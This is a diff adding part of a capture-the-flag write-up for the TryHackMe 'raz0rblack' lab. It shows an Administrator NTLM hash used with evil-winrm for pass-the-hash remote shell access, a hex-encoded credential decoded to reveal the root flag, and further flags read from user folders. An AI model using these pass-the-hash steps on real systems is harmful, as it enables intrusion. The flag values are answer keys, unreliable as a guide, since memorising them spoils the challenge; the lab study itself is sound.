@@ -988,3 +988,114 @@ raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07
 [*] Cleaning up...
 ```
 
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# evil-winrm -i 10.10.57.247 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        5/21/2021   9:45 AM                3D Objects
+d-r---        5/21/2021   9:45 AM                Contacts
+d-r---        5/21/2021   9:45 AM                Desktop
+d-r---        5/21/2021   9:45 AM                Documents
+d-r---        5/21/2021   9:45 AM                Downloads
+d-r---        5/21/2021   9:45 AM                Favorites
+d-r---        5/21/2021   9:45 AM                Links
+d-r---        5/21/2021   9:45 AM                Music
+d-r---        5/21/2021   9:45 AM                Pictures
+d-r---        5/21/2021   9:45 AM                Saved Games
+d-r---        5/21/2021   9:45 AM                Searches
+d-r---        5/21/2021   9:45 AM                Videos
+-a----        2/25/2021   1:08 PM            290 cookie.json
+-a----        2/25/2021   1:12 PM           2512 root.xml
+
+
+*Evil-WinRM* PS C:\Users\Administrator> type root.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Administrator</S>
+      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
+  </Obj>
+</Objs>
+```
+
+```python
+root@rE3oN:~/thm/machines/medium# python3
+Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> s = "44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a"
+>>> print(bytes.fromhex(s).decode('ASCII'))
+Damn you are a genius.
+But, I apologize for cheating you like this.
+
+Here is your Root Flag
+THM{1b4f46cc4fba46348273d18dc91da20d}
+
+Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.
+
+If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
+Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
+```
+
+```shell
+*Evil-WinRM* PS C:\Users\Administrator> cd C:\Users
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/25/2021   1:25 PM                Administrator
+d-----        2/25/2021  10:16 AM                lvetrova
+d-r---        2/23/2021   6:21 AM                Public
+d-----        2/25/2021  10:20 AM                twilliams
+d-----        2/25/2021   9:34 AM                xyan1d3
+
+
+*Evil-WinRM* PS C:\Users> cd twilliams
+*Evil-WinRM* PS C:\Users\twilliams> ls
+
+
+    Directory: C:\Users\twilliams
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021  10:18 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
+                                                 finitely_definitely_not_a_flag.exe
+
+*Evil-WinRM* PS C:\Users\twilliams> type definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
+THM{5144f2c4107b7cab04916724e3749fb0}
+```
